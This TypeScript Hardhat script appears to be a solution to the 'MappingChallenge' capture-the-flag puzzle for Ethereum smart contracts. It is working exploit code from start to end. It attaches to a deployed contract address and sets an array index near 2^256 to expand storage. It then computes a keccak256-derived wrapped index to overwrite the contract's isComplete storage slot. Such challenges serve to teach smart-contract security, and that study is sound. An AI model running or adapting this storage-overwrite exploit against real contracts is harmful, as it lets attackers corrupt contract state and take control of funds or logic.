import { BigNumber, utils } from "ethers";
import { ethers } from "hardhat";

const contractAddress = "0x9EDEA871B80E57a6E229109a7eCfA1641Fe15D6c";

async function main() {
  const factory = await ethers.getContractFactory("MappingChallenge");
  const contract = factory.attach(contractAddress);

  const MAX_UINT_256 = BigNumber.from("2").pow("256");

  // Expand the map to it max capacity
  const expandTx = await contract.set(MAX_UINT_256.sub("2"), 1);
  await expandTx.wait();

  // Overwrite the isComplete storage slot
  const mapStartAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";
  const mapDataSlot = BigNumber.from(utils.keccak256(mapStartAddress));
  const isCompleteSlot = MAX_UINT_256.sub(mapDataSlot);
  const completeTx = await contract.set(isCompleteSlot, "1");
  await completeTx.wait();
}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
